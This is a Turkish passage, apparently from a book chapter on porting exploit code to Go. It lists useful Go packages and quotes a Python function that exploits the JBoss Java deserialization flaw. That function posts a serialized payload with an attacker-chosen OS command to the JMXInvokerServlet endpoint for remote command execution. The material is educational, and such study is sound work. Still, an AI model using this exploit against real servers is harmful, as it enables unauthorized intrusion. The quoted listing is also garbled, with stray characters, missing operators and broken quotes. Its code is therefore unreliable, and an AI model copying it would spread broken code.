## Sömürü Kodlarını Go'ya Taşımak

Çeşitli nedenlerle mevcut bir sömürü (exploit) kodunu Go'ya taşımak isteyebilirsiniz. Mevcut sömürü kodu bozuk, eksik ya da hedeflemek istediğiniz sistem veya sürümle uyumsuz olabilir. Elbette bozuk veya eksik kodu, yazıldığı dilde genişletebilir veya güncelleyebilirsiniz; ancak Go size kolay çapraz-derleme (cross-compilation), tutarlı sözdizimi ve girinti kuralları, ayrıca güçlü bir standart kütüphane sunar. Bunların tümü, özelliklerden ödün vermeden sömürü kodunuzu tartışmaya açık şekilde daha taşınabilir ve okunabilir hâle getirir.

Mevcut bir sömürüyü taşırken muhtemelen en zorlu görev, aynı işlevsellik seviyesini elde etmek için eşdeğer Go kütüphanelerini ve fonksiyon çağrılarını belirlemektir. Örneğin, endianness, kodlama (encoding) ve şifreleme (encryption) karşılıklarını bulmak biraz araştırma gerektirebilir; özellikle de Go konusunda fazla deneyimi olmayanlar için. Neyse ki, ağ tabanlı iletişimin karmaşıklığını önceki bölümlerde ele aldık. Bunun uygulamaları ve incelikleri, umarız, size artık tanıdık geliyordur.

Go'nun standart paketlerini sömürü geliştirme veya port etme (taşıma) amaçlarıyla kullanmanın sayısız yolunu bulacaksınız. Bu paketleri ve kullanım alanlarını tek bir bölümde kapsamlı şekilde ele almak gerçekçi olmadığından, sizi https://golang.org/pkg/ adresindeki resmi Go dokümantasyonunu incelemeye teşvik ediyoruz. Dokümantasyon oldukça kapsamlıdır ve fonksiyon ile paket kullanımını anlamanıza yardımcı olacak çok sayıda iyi örnek içerir. Sömürü geliştirme sırasında muhtemelen en çok ilginizi çekecek bazı paketler şunlardır:

- `bytes`  
  Düşük seviyeli bayt (byte) manipülasyonu sağlar.
- `crypto`  
  Çeşitli simetrik ve asimetrik şifreleme yöntemlerini ve mesaj doğrulama (message authentication) mekanizmalarını uygular.
- `debug`  
  Çeşitli dosya türlerinin üstverisini (metadata) ve içeriklerini inceler.
- `encoding`  
  Verileri binary, Hex, Base64 gibi çeşitli yaygın biçimler kullanarak kodlar (encode) ve çözer (decode).
- `io` ve `bufio`  
  Dosya sistemi, standart çıktı, ağ bağlantıları ve benzeri yaygın arayüz türlerinden veri okur ve bunlara veri yazar.
- `net`  
  HTTP ve SMTP gibi çeşitli protokoller kullanarak istemci-sunucu etkileşimini kolaylaştırır.
- `os`  
  Yerel işletim sistemiyle etkileşim kurar ve komut çalıştırır.
- `syscall`  
  Düşük seviyeli sistem çağrılarını (system call) yapmak için bir arayüz sunar.
- `unicode`  
  Verileri UTF-16 veya UTF-8 kullanarak kodlar ve çözer.
- `unsafe`  
  İşletim sistemiyle etkileşimde bulunurken Go’nun tip güvenliği kontrollerini atlamak için kullanışlıdır.

Kabul etmek gerekir ki, bu paketlerin bazıları özellikle alt seviyeli Windows etkileşimlerini tartıştığımız sonraki bölümlerde daha faydalı olacaktır; ancak farkındalığınız için bu listeyi dahil ettik. Bu paketleri ayrıntılı olarak ele almaya çalışmak yerine, bu paketlerin bazılarını kullanarak mevcut bir sömürü kodunu nasıl port edeceğinizi göstereceğiz.

## Python'dan Bir Sömürü Kodunu Port Etme

Bu ilk örnekte, 2015’te yayımlanan bir Java serileştirme (deserialization) zafiyetine ait sömürü kodunu taşıyacaksınız. Birkaç farklı CVE altında kategorize edilen bu zafiyet, yaygın uygulamalarda, sunucularda ve kütüphanelerde Java nesnelerinin serileştirilmesinden (deserialization) etkilenir. Bu zafiyet, sunucu tarafında çalıştırılmadan önce girişi doğrulamayan bir serileştirme kütüphanesi tarafından ortaya çıkar (zafiyetlerin yaygın bir nedeni). Odağımızı popüler bir Java Enterprise Edition uygulama sunucusu olan JBoss’u sömürmeye daraltacağız. https://github.com/roo7break/serialator/blob/master/serialator.py adresinde, bu zafiyeti birden fazla uygulamada sömürmek için mantık içeren bir Python betiği bulacaksınız. Liste 9-3, kopyalayacağınız mantığı sağlar.

```python
def jboss_attack(HOST, PORT, SSL_On, _cmd):
     # The below code is based on the jboss_java_serialize.nas1 script within Nessus

      This function sets up the attack payload for Boss
      0.11

      body_serObj = hex2raw3("ACE0000573720032737--SNIPPED FOR BREVITY--017#00") 0

      cleng = len(_cmd)
      body_serObj += chr(cleng) + _cmd
      body_serObj    hex2raw3("740004657865637571--SNIPPED FOR BREVITY-7E00A") 0

      if SSL_On: 0
           webservice = httplib2.Http(disable_ssl_certificate_validation.True)
           URL_ADDR = "%s://%s:%s" % ('https',HOST,PORT)
      else:
           webservice = httplib2.Http()
           URL_ADDR   "%s://%s:%s" % ('http',HOST,PORT)
      headers = {"User-Agent":"JBoss_RCE_POC", 0
               "Content-type':"application/x-java-serialized-object --SNIPPED FOR BREVITY--",
               "Content-length":"%d" % len(body_serObj)

      resp, content = webservice.request0 (
          URL_ADDR+"/invoker/JMInvokerServlet",
           "POST",
          body.body_serObj,
          headers =headers)
      # print provided response.
      print(" [ii Response received from target: %s" % resp)
```

**Liste 9-3: Python serileştirme sömürü kodu**

Burada neyle uğraştığınıza bir bakalım. Fonksiyon, parametre olarak bir hedef adını (host), portu, SSL göstergesini ve işletim sistemi komutunu alır. Doğru isteği (request) oluşturmak için fonksiyonun, serileştirilmiş bir Java nesnesini temsil eden bir yük/faydalı yük (payload) oluşturması gerekir. Bu betik, `body_serObj` adlı bir değişkene sabitlenmiş bir dizi bayt yazarak başlar. Bu baytlar kısalık adına kırpılmıştır; ancak kodda bir string değeri olarak temsil edildiklerine dikkat edin. Bu, iki karakterinin birleşerek tek bir bayt gösterimine dönüştürüleceği bir onaltılık (hexadecimal) string’dir. Örneğin, `AC` değerini onaltılık bayt `\xAC`’e dönüştürmeniz gerekir. Bu dönüşümü gerçekleştirmek için sömürü kodu `hex2raw3` adlı bir fonksiyonu çağırır. Bu fonksiyonun alttaki uygulama ayrıntıları önemsizdir; onaltılık string’e ne olduğunun farkında olmanız yeterlidir.
